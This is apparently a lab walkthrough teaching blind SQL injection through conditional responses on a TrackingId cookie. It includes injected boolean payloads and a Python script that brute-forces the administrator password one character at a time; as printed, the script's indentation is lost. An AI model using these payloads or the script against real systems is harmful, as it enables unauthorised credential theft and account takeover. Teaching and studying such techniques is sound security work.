 
## Exploiting blind SQL injection by triggering conditional responses

     

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'   
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.   
This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:   
…xyz' AND '1'='1  
…xyz' AND '1'='2   

The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true, and so the "Welcome back" message will be displayed. Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the "Welcome back" message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.  
  
For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can determine the length of the password by sending a series of interger input with boolean. And We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.   

To do this, we start with the following input:   
```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a  
```
```sql
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```
	
Verify that the condition is true, confirming that there is a user called administrator.   
  
```sql
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>5)='administrator'-- 
```	
	
	
Figuring out the length of the password. We can use binary search method to figure out the length of the password.  
BURP SUITE is best to do this with sniper style and sequential numbers as payload.   
  
  
```SQL 
xyz' AND (SELECT SUBSTRING(Password,1,1) FROM Users WHERE Username = 'Administrator')>'m   
```
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.   

Next, we send the following input:   
```sql
xyz' AND (SELECT SUBSTRING(Password,1,1) FROM Users WHERE Username = 'Administrator')>'t  
```

	
This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:   
```sql
xyz' AND (SELECT SUBSTRING(Password,1,1) FROM Users WHERE Username = 'Administrator')='s  
```
	

We can continue this process to systematically determine the full password for the `Administrator` user.   
  
Doing one requests at a time that too manually will take a whole day to solve.   
BURP SUITE can be used to solve this password character bruter force but on community edition it will take around an hour(for 20 character password) depending upon the length of the password.   
But with PYTHON script, it can be done within 10 min for 20 character long password.  

```python 
import sys  
import requests  
import urllib3  
import urllib  
  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
  
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}  
  
def sqli_password(url):  
password_extracted = ""  
for i in range (1, 21):  
for j in range (32, 126):  
sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)  
sqli_payload_encoded = urllib.parse.quote(sqli_payload)  
cookies = {'TrackingId': 'dGk1lp87llBYRfaU' + sqli_payload_encoded, 'session': 'uidEe9Z9af1pJomLagUWrOrITm6euDPO'}  
r = requests.get(url,cookies=cookies, verify=False,)  
  
if "Welcome" not in r.text:  
sys.stdout.write('\r' + password_extracted + chr(j))  
sys.stdout.flush()  
else:  
password_extracted += chr(j)  
sys.stdout.write('\r' + password_extracted)  
sys.stdout.flush()  
break  
  
def main():  
if len(sys.argv) != 2:  
print("(+) Usage: %s <url>" % sys.argv[0])  
print("(+) Example: %s www.example.com" % sys.argv[0])  
  
url = sys.argv[1]  
print("(+) Retrieving adminstrator password...")  
sqli_password(url)  
  
if __name__ == '__main__':  
main()
```
  

### Note

The `SUBSTRING` function is called `SUBSTR` on some types of database.